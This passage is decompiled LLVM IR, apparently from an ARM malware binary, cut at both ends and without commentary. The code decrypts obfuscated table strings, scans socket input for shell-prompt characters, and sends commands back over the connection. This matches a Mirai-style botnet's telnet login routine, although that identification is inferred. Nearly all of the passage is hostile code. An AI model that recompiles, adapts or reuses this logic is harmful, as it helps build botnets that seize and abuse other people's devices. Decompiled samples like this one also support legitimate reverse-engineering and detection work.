  store i1 %v2_107e0, i1* %cpsr_c.global-to-local, align 1
  %v7_107e0 = icmp eq i32 %v4_107dc, -1
  store i1 %v7_107e0, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_11178 = call i32 @table_lock_val(i32 10)
  br i1 %v7_107e0, label %dec_label_pc_11174, label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %dec_label_pc_107b0
  store i32 %v1_11178, i32* %r0.global-to-local, align 4
  %v0_107f0 = load i32, i32* @r6, align 4
  %v1_107f0 = add i32 %v0_107f0, 4
  %v2_107f0 = inttoptr i32 %v1_107f0 to i32*
  %v3_107f0 = load i32, i32* %v2_107f0, align 4
  store i32 %v3_107f0, i32* %r0.global-to-local, align 4
  %v1_107f4 = call i32 @__GI___libc_close(i32 %v3_107f0)
  store i32 %v1_107f4, i32* %r0.global-to-local, align 4
  %v0_107f8 = load i32, i32* @r6, align 4
  %v1_107f8 = add i32 %v0_107f8, 284
  %v2_107f8 = inttoptr i32 %v1_107f8 to i8*
  %v3_107f8 = load i8, i8* %v2_107f8, align 1
  %v4_107f8 = zext i8 %v3_107f8 to i32
  %v1_107fc = add nuw nsw i32 %v4_107f8, 1
  %v1_10800 = urem i32 %v1_107fc, 256
  store i32 %v1_10800, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10808 = icmp ugt i32 %v1_10800, 9
  store i1 %v2_10808, i1* %cpsr_c.global-to-local, align 1
  %v7_10808 = icmp eq i32 %v1_10800, 10
  store i1 %v7_10808, i1* %cpsr_z.global-to-local, align 1
  %v2_1080c = add i32 %v0_107f8, 4
  %v3_1080c = inttoptr i32 %v2_1080c to i32*
  store i32 -1, i32* %v3_1080c, align 4
  %v0_10810 = load i32, i32* @r3, align 4
  %v1_10810 = trunc i32 %v0_10810 to i8
  %v2_10810 = load i32, i32* @r6, align 4
  %v3_10810 = add i32 %v2_10810, 284
  %v4_10810 = inttoptr i32 %v3_10810 to i8*
  store i8 %v1_10810, i8* %v4_10810, align 1
  %v0_10814 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10814, label %dec_label_pc_10818, label %dec_label_pc_11020

dec_label_pc_10818:                               ; preds = %dec_label_pc_107e8
  store i32 0, i32* @r3, align 4
  %v1_1081c = load i32, i32* @r6, align 4
  %v2_1081c = add i32 %v1_1081c, 12
  %v3_1081c = inttoptr i32 %v2_1081c to i32*
  store i32 0, i32* %v3_1081c, align 4
  %v0_10820 = load i32, i32* @r3, align 4
  %v1_10820 = trunc i32 %v0_10820 to i8
  %v2_10820 = load i32, i32* @r6, align 4
  %v3_10820 = add i32 %v2_10820, 284
  %v4_10820 = inttoptr i32 %v3_10820 to i8*
  store i8 %v1_10820, i8* %v4_10820, align 1
  br label %dec_label_pc_10824

dec_label_pc_10824:                               ; preds = %dec_label_pc_11020, %dec_label_pc_10818
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10828

dec_label_pc_10828:                               ; preds = %.thread1199, %dec_label_pc_10f00, %dec_label_pc_10b48, %dec_label_pc_10a74, %dec_label_pc_109a0, %dec_label_pc_108cc, %dec_label_pc_10824
  %v0_10828 = load i32, i32* @r6, align 4
  %v1_10828 = add i32 %v0_10828, 24
  %v2_10828 = inttoptr i32 %v1_10828 to i32*
  %v3_10828 = load i32, i32* %v2_10828, align 4
  %v0_1082c = load i32, i32* @r7, align 4
  %v2_1082c = sub i32 %v0_1082c, %v3_10828
  %v3_1082c = icmp uge i32 %v0_1082c, %v3_10828
  store i1 %v3_1082c, i1* %cpsr_c.global-to-local, align 1
  %v4_1082c = xor i32 %v0_1082c, %v3_10828
  %v5_1082c = xor i32 %v2_1082c, %v0_1082c
  %v6_1082c = and i32 %v5_1082c, %v4_1082c
  %v7_1082c = icmp slt i32 %v6_1082c, 0
  %v8_1082c = icmp slt i32 %v2_1082c, 0
  %v9_1082c = icmp eq i32 %v0_1082c, %v3_10828
  store i1 %v9_1082c, i1* %cpsr_z.global-to-local, align 1
  %v2_10830 = xor i1 %v8_1082c, %v7_1082c
  %v0_1082c.v3_10828 = select i1 %v2_10830, i32 %v0_1082c, i32 %v3_10828
  store i32 %v0_1082c.v3_10828, i32* %r1.global-to-local, align 4
  %v2_10838 = sub i32 %v3_10828, %v0_1082c.v3_10828
  store i32 %v2_10838, i32* @r2, align 4
  store i32 %v2_10838, i32* %v2_10828, align 4
  %v0_10840 = load i32, i32* @sl, align 4
  %v1_10840 = load i32, i32* %r1.global-to-local, align 4
  %v2_10840 = add i32 %v1_10840, %v0_10840
  store i32 %v2_10840, i32* @r1, align 4
  store i32 %v0_10840, i32* @r0, align 4
  %v3_10848 = call i32 @memmove(i32 %v0_10840, i32 %v2_10840, i32 %v2_10838)
  store i32 %v3_10848, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10710

dec_label_pc_10850:                               ; preds = %dec_label_pc_10710
  %v1_10850 = add i32 %v0_10710, 24
  %v2_10850 = inttoptr i32 %v1_10850 to i32*
  %v3_10850 = load i32, i32* %v2_10850, align 4
  store i32 %v3_10850, i32* %r2.global-to-local, align 4
  %v1_10854 = add i32 %v3_10850, -1
  store i32 %v1_10854, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10858 = icmp eq i32 %v1_10854, 0
  store i1 %v2_10858, i1* %cpsr_z.global-to-local, align 1
  %tmp1939 = icmp slt i32 %v1_10854, 1
  br i1 %tmp1939, label %dec_label_pc_10694.backedge.thread, label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_10850
  %v2_10860 = add i32 %v1_10854, %v0_10710
  store i32 %v2_10860, i32* %r3.global-to-local, align 4
  %v1_10864 = add i32 %v2_10860, 28
  %v2_10864 = inttoptr i32 %v1_10864 to i8*
  %v3_10864 = load i8, i8* %v2_10864, align 1
  %v4_10864 = zext i8 %v3_10864 to i32
  store i32 %v4_10864, i32* %r3.global-to-local, align 4
  %v2_10868 = icmp ugt i8 %v3_10864, 61
  store i1 %v2_10868, i1* %cpsr_c.global-to-local, align 1
  %v7_10868 = icmp eq i8 %v3_10864, 62
  store i1 %v7_10868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10868, label %dec_label_pc_108cc, label %bb1940

bb1940:                                           ; preds = %dec_label_pc_10860
  %v3_1086c = icmp ugt i8 %v3_10864, 57
  store i1 %v3_1086c, i1* %cpsr_c.global-to-local, align 1
  %v8_1086c = icmp eq i8 %v3_10864, 58
  store i1 %v8_1086c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1086c, label %dec_label_pc_108cc, label %dec_label_pc_10874

dec_label_pc_10874:                               ; preds = %bb1940
  %v2_10874 = icmp ugt i8 %v3_10864, 35
  store i1 %v2_10874, i1* %cpsr_c.global-to-local, align 1
  %v7_10874 = icmp eq i8 %v3_10864, 36
  store i1 %v7_10874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10874, label %dec_label_pc_108cc, label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_10874
  %v2_1087c = icmp ugt i8 %v3_10864, 34
  store i1 %v2_1087c, i1* %cpsr_c.global-to-local, align 1
  %v7_1087c = icmp eq i8 %v3_10864, 35
  store i1 %v7_1087c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1087c, label %dec_label_pc_108cc, label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %dec_label_pc_1087c
  %v2_10884 = icmp ugt i8 %v3_10864, 36
  store i1 %v2_10884, i1* %cpsr_c.global-to-local, align 1
  %v7_10884 = icmp eq i8 %v3_10864, 37
  store i1 %v7_10884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10884, label %dec_label_pc_108cc, label %dec_label_pc_108b0.preheader

dec_label_pc_108b0.preheader:                     ; preds = %dec_label_pc_10884
  %v3_10888 = add i32 %v0_10710, 28
  %v2_1088c = add i32 %v3_10888, %v3_10850
  store i32 %v2_1088c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_108b0

dec_label_pc_10898:                               ; preds = %bb1941
  %v2_10898 = icmp ugt i8 %v3_108b8, 35
  store i1 %v2_10898, i1* %cpsr_c.global-to-local, align 1
  %v7_10898 = icmp eq i8 %v3_108b8, 36
  store i1 %v7_10898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10898, label %dec_label_pc_108cc, label %dec_label_pc_108a0

dec_label_pc_108a0:                               ; preds = %dec_label_pc_10898
  %v2_108a0 = icmp ugt i8 %v3_108b8, 34
  store i1 %v2_108a0, i1* %cpsr_c.global-to-local, align 1
  %v7_108a0 = icmp eq i8 %v3_108b8, 35
  store i1 %v7_108a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108a0, label %dec_label_pc_108cc, label %dec_label_pc_108a8

dec_label_pc_108a8:                               ; preds = %dec_label_pc_108a0
  %v2_108a8 = icmp ugt i8 %v3_108b8, 36
  store i1 %v2_108a8, i1* %cpsr_c.global-to-local, align 1
  %v7_108a8 = icmp eq i8 %v3_108b8, 37
  store i1 %v7_108a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108a8, label %dec_label_pc_108cc, label %dec_label_pc_108b0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108b0.preheader, %dec_label_pc_108a8
  %v0_108c4681 = phi i32 [ %v2_1088c, %dec_label_pc_108b0.preheader ], [ %v1_108c4, %dec_label_pc_108a8 ]
  %v0_108b0 = phi i32 [ %v1_10854, %dec_label_pc_108b0.preheader ], [ %v1_108b0, %dec_label_pc_108a8 ]
  %v1_108b0 = add i32 %v0_108b0, -1
  store i32 %v1_108b0, i32* %r1.global-to-local, align 4
  %v2_108b0 = icmp ne i32 %v0_108b0, 0
  store i1 %v2_108b0, i1* %cpsr_c.global-to-local, align 1
  %v7_108b0 = icmp eq i32 %v0_108b0, 1
  store i1 %v7_108b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108b0, label %dec_label_pc_10694.backedge.thread2185, label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108b0
  %v1_108b8 = add i32 %v0_108c4681, -2
  %v2_108b8 = inttoptr i32 %v1_108b8 to i8*
  %v3_108b8 = load i8, i8* %v2_108b8, align 1
  %v4_108b8 = zext i8 %v3_108b8 to i32
  store i32 %v4_108b8, i32* %r2.global-to-local, align 4
  %v2_108bc = icmp ugt i8 %v3_108b8, 61
  store i1 %v2_108bc, i1* %cpsr_c.global-to-local, align 1
  %v7_108bc = icmp eq i8 %v3_108b8, 62
  store i1 %v7_108bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108bc, label %.thread680, label %bb1941

.thread680:                                       ; preds = %dec_label_pc_108b8
  %v1_108c4682 = add i32 %v0_108c4681, -1
  store i32 %v1_108c4682, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_108cc

bb1941:                                           ; preds = %dec_label_pc_108b8
  %v3_108c0 = icmp ugt i8 %v3_108b8, 57
  store i1 %v3_108c0, i1* %cpsr_c.global-to-local, align 1
  %v8_108c0 = icmp eq i8 %v3_108b8, 58
  store i1 %v8_108c0, i1* %cpsr_z.global-to-local, align 1
  %v1_108c4 = add i32 %v0_108c4681, -1
  store i32 %v1_108c4, i32* %r3.global-to-local, align 4
  br i1 %v8_108c0, label %dec_label_pc_108cc, label %dec_label_pc_10898

dec_label_pc_108cc:                               ; preds = %bb1941, %dec_label_pc_108a8, %dec_label_pc_108a0, %dec_label_pc_10898, %dec_label_pc_10884, %dec_label_pc_10860, %.thread680, %dec_label_pc_1087c, %dec_label_pc_10874, %bb1940
  %v0_108d0 = phi i32 [ %v1_10854, %dec_label_pc_10884 ], [ %v1_10854, %dec_label_pc_10860 ], [ %v1_108b0, %.thread680 ], [ %v1_10854, %dec_label_pc_1087c ], [ %v1_10854, %dec_label_pc_10874 ], [ %v1_10854, %bb1940 ], [ %v1_108b0, %dec_label_pc_10898 ], [ %v1_108b0, %dec_label_pc_108a0 ], [ %v1_108b0, %dec_label_pc_108a8 ], [ %v1_108b0, %bb1941 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_108d0 = add i32 %v0_108d0, 1
  store i32 %v1_108d0, i32* @r7, align 4
  %v1_108d4 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_108e4 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_108e4, i32* %r0.global-to-local, align 4
  %v3_108e8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_108e8, i32* %r2.global-to-local, align 4
  store i32 %v3_108e4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_108f4 = load i32, i32* @r6, align 4
  %v1_108f4 = add i32 %v0_108f4, 4
  %v2_108f4 = inttoptr i32 %v1_108f4 to i32*
  %v3_108f4 = load i32, i32* %v2_108f4, align 4
  store i32 %v3_108f4, i32* %r0.global-to-local, align 4
  %v4_108f8 = call i32 @__libc_send(i32 %v3_108f4, i32 %v3_108e4, i32 %v3_108e8, i32 16384)
  store i32 %v4_108f8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10908 = load i32, i32* @r6, align 4
  %v1_10908 = add i32 %v0_10908, 4
  %v2_10908 = inttoptr i32 %v1_10908 to i32*
  %v3_10908 = load i32, i32* %v2_10908, align 4
  store i32 %v3_10908, i32* %r0.global-to-local, align 4
  %v4_1090c = call i32 @__libc_send(i32 %v3_10908, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10914 = call i32 @table_lock_val(i32 8)
  store i32 %v1_10914, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_1091c = load i32, i32* @r6, align 4
  %v2_1091c = add i32 %v1_1091c, 12
  %v3_1091c = inttoptr i32 %v2_1091c to i32*
  store i32 10, i32* %v3_1091c, align 4
  br label %dec_label_pc_10828

dec_label_pc_10924:                               ; preds = %dec_label_pc_10710
  %v1_10924 = add i32 %v0_10710, 24
  %v2_10924 = inttoptr i32 %v1_10924 to i32*
  %v3_10924 = load i32, i32* %v2_10924, align 4
  store i32 %v3_10924, i32* %r2.global-to-local, align 4
  %v1_10928 = add i32 %v3_10924, -1
  store i32 %v1_10928, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1092c = icmp eq i32 %v1_10928, 0
  store i1 %v2_1092c, i1* %cpsr_z.global-to-local, align 1
  %tmp1942 = icmp slt i32 %v1_10928, 1
  br i1 %tmp1942, label %dec_label_pc_10694.backedge.thread, label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_10924
  %v2_10934 = add i32 %v1_10928, %v0_10710
  store i32 %v2_10934, i32* %r3.global-to-local, align 4
  %v1_10938 = add i32 %v2_10934, 28
  %v2_10938 = inttoptr i32 %v1_10938 to i8*
  %v3_10938 = load i8, i8* %v2_10938, align 1
  %v4_10938 = zext i8 %v3_10938 to i32
  store i32 %v4_10938, i32* %r3.global-to-local, align 4
  %v2_1093c = icmp ugt i8 %v3_10938, 61
  store i1 %v2_1093c, i1* %cpsr_c.global-to-local, align 1
  %v7_1093c = icmp eq i8 %v3_10938, 62
  store i1 %v7_1093c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1093c, label %dec_label_pc_109a0, label %bb1943

bb1943:                                           ; preds = %dec_label_pc_10934
  %v3_10940 = icmp ugt i8 %v3_10938, 57
  store i1 %v3_10940, i1* %cpsr_c.global-to-local, align 1
  %v8_10940 = icmp eq i8 %v3_10938, 58
  store i1 %v8_10940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10940, label %dec_label_pc_109a0, label %dec_label_pc_10948

dec_label_pc_10948:                               ; preds = %bb1943
  %v2_10948 = icmp ugt i8 %v3_10938, 35
  store i1 %v2_10948, i1* %cpsr_c.global-to-local, align 1
  %v7_10948 = icmp eq i8 %v3_10938, 36
  store i1 %v7_10948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10948, label %dec_label_pc_109a0, label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_10948
  %v2_10950 = icmp ugt i8 %v3_10938, 34
  store i1 %v2_10950, i1* %cpsr_c.global-to-local, align 1
  %v7_10950 = icmp eq i8 %v3_10938, 35
  store i1 %v7_10950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10950, label %dec_label_pc_109a0, label %dec_label_pc_10958

dec_label_pc_10958:                               ; preds = %dec_label_pc_10950
  %v2_10958 = icmp ugt i8 %v3_10938, 36
  store i1 %v2_10958, i1* %cpsr_c.global-to-local, align 1
  %v7_10958 = icmp eq i8 %v3_10938, 37
  store i1 %v7_10958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10958, label %dec_label_pc_109a0, label %dec_label_pc_10984.preheader

dec_label_pc_10984.preheader:                     ; preds = %dec_label_pc_10958
  %v3_1095c = add i32 %v0_10710, 28
  %v2_10960 = add i32 %v3_1095c, %v3_10924
  store i32 %v2_10960, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10984

dec_label_pc_1096c:                               ; preds = %bb1944
  %v2_1096c = icmp ugt i8 %v3_1098c, 35
  store i1 %v2_1096c, i1* %cpsr_c.global-to-local, align 1
  %v7_1096c = icmp eq i8 %v3_1098c, 36
  store i1 %v7_1096c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1096c, label %dec_label_pc_109a0, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_1096c
  %v2_10974 = icmp ugt i8 %v3_1098c, 34
  store i1 %v2_10974, i1* %cpsr_c.global-to-local, align 1
  %v7_10974 = icmp eq i8 %v3_1098c, 35
  store i1 %v7_10974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10974, label %dec_label_pc_109a0, label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10974
  %v2_1097c = icmp ugt i8 %v3_1098c, 36
  store i1 %v2_1097c, i1* %cpsr_c.global-to-local, align 1
  %v7_1097c = icmp eq i8 %v3_1098c, 37
  store i1 %v7_1097c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1097c, label %dec_label_pc_109a0, label %dec_label_pc_10984

dec_label_pc_10984:                               ; preds = %dec_label_pc_10984.preheader, %dec_label_pc_1097c
  %v0_10998688 = phi i32 [ %v2_10960, %dec_label_pc_10984.preheader ], [ %v1_10998, %dec_label_pc_1097c ]
  %v0_10984 = phi i32 [ %v1_10928, %dec_label_pc_10984.preheader ], [ %v1_10984, %dec_label_pc_1097c ]
  %v1_10984 = add i32 %v0_10984, -1
  store i32 %v1_10984, i32* %r1.global-to-local, align 4
  %v2_10984 = icmp ne i32 %v0_10984, 0
  store i1 %v2_10984, i1* %cpsr_c.global-to-local, align 1
  %v7_10984 = icmp eq i32 %v0_10984, 1
  store i1 %v7_10984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10984, label %dec_label_pc_10694.backedge.thread2185, label %dec_label_pc_1098c

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10984
  %v1_1098c = add i32 %v0_10998688, -2
  %v2_1098c = inttoptr i32 %v1_1098c to i8*
  %v3_1098c = load i8, i8* %v2_1098c, align 1
  %v4_1098c = zext i8 %v3_1098c to i32
  store i32 %v4_1098c, i32* %r2.global-to-local, align 4
  %v2_10990 = icmp ugt i8 %v3_1098c, 61
  store i1 %v2_10990, i1* %cpsr_c.global-to-local, align 1
  %v7_10990 = icmp eq i8 %v3_1098c, 62
  store i1 %v7_10990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10990, label %.thread687, label %bb1944

.thread687:                                       ; preds = %dec_label_pc_1098c
  %v1_10998689 = add i32 %v0_10998688, -1
  store i32 %v1_10998689, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_109a0

bb1944:                                           ; preds = %dec_label_pc_1098c
  %v3_10994 = icmp ugt i8 %v3_1098c, 57
  store i1 %v3_10994, i1* %cpsr_c.global-to-local, align 1
  %v8_10994 = icmp eq i8 %v3_1098c, 58
  store i1 %v8_10994, i1* %cpsr_z.global-to-local, align 1
  %v1_10998 = add i32 %v0_10998688, -1
  store i32 %v1_10998, i32* %r3.global-to-local, align 4
  br i1 %v8_10994, label %dec_label_pc_109a0, label %dec_label_pc_1096c

dec_label_pc_109a0:                               ; preds = %bb1944, %dec_label_pc_1097c, %dec_label_pc_10974, %dec_label_pc_1096c, %dec_label_pc_10958, %dec_label_pc_10934, %.thread687, %dec_label_pc_10950, %dec_label_pc_10948, %bb1943
  %v0_109a4 = phi i32 [ %v1_10928, %dec_label_pc_10958 ], [ %v1_10928, %dec_label_pc_10934 ], [ %v1_10984, %.thread687 ], [ %v1_10928, %dec_label_pc_10950 ], [ %v1_10928, %dec_label_pc_10948 ], [ %v1_10928, %bb1943 ], [ %v1_10984, %dec_label_pc_1096c ], [ %v1_10984, %dec_label_pc_10974 ], [ %v1_10984, %dec_label_pc_1097c ], [ %v1_10984, %bb1944 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_109a4 = add i32 %v0_109a4, 1
  store i32 %v1_109a4, i32* @r7, align 4
  %v1_109a8 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_109b8 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_109b8, i32* %r0.global-to-local, align 4
  %v3_109bc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_109bc, i32* %r2.global-to-local, align 4
  store i32 %v3_109b8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_109c8 = load i32, i32* @r6, align 4
  %v1_109c8 = add i32 %v0_109c8, 4
  %v2_109c8 = inttoptr i32 %v1_109c8 to i32*
  %v3_109c8 = load i32, i32* %v2_109c8, align 4
  store i32 %v3_109c8, i32* %r0.global-to-local, align 4
  %v4_109cc = call i32 @__libc_send(i32 %v3_109c8, i32 %v3_109b8, i32 %v3_109bc, i32 16384)
  store i32 %v4_109cc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_109dc = load i32, i32* @r6, align 4
  %v1_109dc = add i32 %v0_109dc, 4
  %v2_109dc = inttoptr i32 %v1_109dc to i32*
  %v3_109dc = load i32, i32* %v2_109dc, align 4
  store i32 %v3_109dc, i32* %r0.global-to-local, align 4
  %v4_109e0 = call i32 @__libc_send(i32 %v3_109dc, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_109e8 = call i32 @table_lock_val(i32 7)
  store i32 %v1_109e8, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_109f0 = load i32, i32* @r6, align 4
  %v2_109f0 = add i32 %v1_109f0, 12
  %v3_109f0 = inttoptr i32 %v2_109f0 to i32*
  store i32 9, i32* %v3_109f0, align 4
  br label %dec_label_pc_10828

dec_label_pc_109f8:                               ; preds = %dec_label_pc_10710
  %v1_109f8 = add i32 %v0_10710, 24
  %v2_109f8 = inttoptr i32 %v1_109f8 to i32*
  %v3_109f8 = load i32, i32* %v2_109f8, align 4
  store i32 %v3_109f8, i32* %r2.global-to-local, align 4
  %v1_109fc = add i32 %v3_109f8, -1
  store i32 %v1_109fc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a00 = icmp eq i32 %v1_109fc, 0
  store i1 %v2_10a00, i1* %cpsr_z.global-to-local, align 1
  %tmp1945 = icmp slt i32 %v1_109fc, 1
  br i1 %tmp1945, label %dec_label_pc_10694.backedge.thread, label %dec_label_pc_10a08

dec_label_pc_10a08:                               ; preds = %dec_label_pc_109f8
  %v2_10a08 = add i32 %v1_109fc, %v0_10710
  store i32 %v2_10a08, i32* %r3.global-to-local, align 4
  %v1_10a0c = add i32 %v2_10a08, 28
  %v2_10a0c = inttoptr i32 %v1_10a0c to i8*
  %v3_10a0c = load i8, i8* %v2_10a0c, align 1
  %v4_10a0c = zext i8 %v3_10a0c to i32
  store i32 %v4_10a0c, i32* %r3.global-to-local, align 4
  %v2_10a10 = icmp ugt i8 %v3_10a0c, 61
  store i1 %v2_10a10, i1* %cpsr_c.global-to-local, align 1
  %v7_10a10 = icmp eq i8 %v3_10a0c, 62
  store i1 %v7_10a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a10, label %dec_label_pc_10a74, label %bb1946

bb1946:                                           ; preds = %dec_label_pc_10a08
  %v3_10a14 = icmp ugt i8 %v3_10a0c, 57
  store i1 %v3_10a14, i1* %cpsr_c.global-to-local, align 1
  %v8_10a14 = icmp eq i8 %v3_10a0c, 58
  store i1 %v8_10a14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10a14, label %dec_label_pc_10a74, label %dec_label_pc_10a1c

dec_label_pc_10a1c:                               ; preds = %bb1946
  %v2_10a1c = icmp ugt i8 %v3_10a0c, 35
  store i1 %v2_10a1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a1c = icmp eq i8 %v3_10a0c, 36
  store i1 %v7_10a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a1c, label %dec_label_pc_10a74, label %dec_label_pc_10a24

dec_label_pc_10a24:                               ; preds = %dec_label_pc_10a1c
  %v2_10a24 = icmp ugt i8 %v3_10a0c, 34
  store i1 %v2_10a24, i1* %cpsr_c.global-to-local, align 1
  %v7_10a24 = icmp eq i8 %v3_10a0c, 35
  store i1 %v7_10a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a24, label %dec_label_pc_10a74, label %dec_label_pc_10a2c

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10a24
  %v2_10a2c = icmp ugt i8 %v3_10a0c, 36
  store i1 %v2_10a2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a2c = icmp eq i8 %v3_10a0c, 37
  store i1 %v7_10a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a2c, label %dec_label_pc_10a74, label %dec_label_pc_10a58.preheader

dec_label_pc_10a58.preheader:                     ; preds = %dec_label_pc_10a2c
  %v3_10a30 = add i32 %v0_10710, 28
  %v2_10a34 = add i32 %v3_10a30, %v3_109f8
  store i32 %v2_10a34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10a58

dec_label_pc_10a40:                               ; preds = %bb1947
  %v2_10a40 = icmp ugt i8 %v3_10a60, 35
  store i1 %v2_10a40, i1* %cpsr_c.global-to-local, align 1
  %v7_10a40 = icmp eq i8 %v3_10a60, 36
  store i1 %v7_10a40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a40, label %dec_label_pc_10a74, label %dec_label_pc_10a48

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a40
  %v2_10a48 = icmp ugt i8 %v3_10a60, 34
  store i1 %v2_10a48, i1* %cpsr_c.global-to-local, align 1
  %v7_10a48 = icmp eq i8 %v3_10a60, 35
  store i1 %v7_10a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a48, label %dec_label_pc_10a74, label %dec_label_pc_10a50

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a48
  %v2_10a50 = icmp ugt i8 %v3_10a60, 36
  store i1 %v2_10a50, i1* %cpsr_c.global-to-local, align 1
  %v7_10a50 = icmp eq i8 %v3_10a60, 37
  store i1 %v7_10a50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a50, label %dec_label_pc_10a74, label %dec_label_pc_10a58

dec_label_pc_10a58:                               ; preds = %dec_label_pc_10a58.preheader, %dec_label_pc_10a50
  %v0_10a6c695 = phi i32 [ %v2_10a34, %dec_label_pc_10a58.preheader ], [ %v1_10a6c, %dec_label_pc_10a50 ]
  %v0_10a58 = phi i32 [ %v1_109fc, %dec_label_pc_10a58.preheader ], [ %v1_10a58, %dec_label_pc_10a50 ]
  %v1_10a58 = add i32 %v0_10a58, -1
  store i32 %v1_10a58, i32* %r1.global-to-local, align 4
  %v2_10a58 = icmp ne i32 %v0_10a58, 0
  store i1 %v2_10a58, i1* %cpsr_c.global-to-local, align 1
  %v7_10a58 = icmp eq i32 %v0_10a58, 1
  store i1 %v7_10a58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a58, label %dec_label_pc_10694.backedge.thread2185, label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a58
  %v1_10a60 = add i32 %v0_10a6c695, -2
  %v2_10a60 = inttoptr i32 %v1_10a60 to i8*
  %v3_10a60 = load i8, i8* %v2_10a60, align 1
  %v4_10a60 = zext i8 %v3_10a60 to i32
  store i32 %v4_10a60, i32* %r2.global-to-local, align 4
  %v2_10a64 = icmp ugt i8 %v3_10a60, 61
  store i1 %v2_10a64, i1* %cpsr_c.global-to-local, align 1
  %v7_10a64 = icmp eq i8 %v3_10a60, 62
  store i1 %v7_10a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a64, label %.thread694, label %bb1947

.thread694:                                       ; preds = %dec_label_pc_10a60
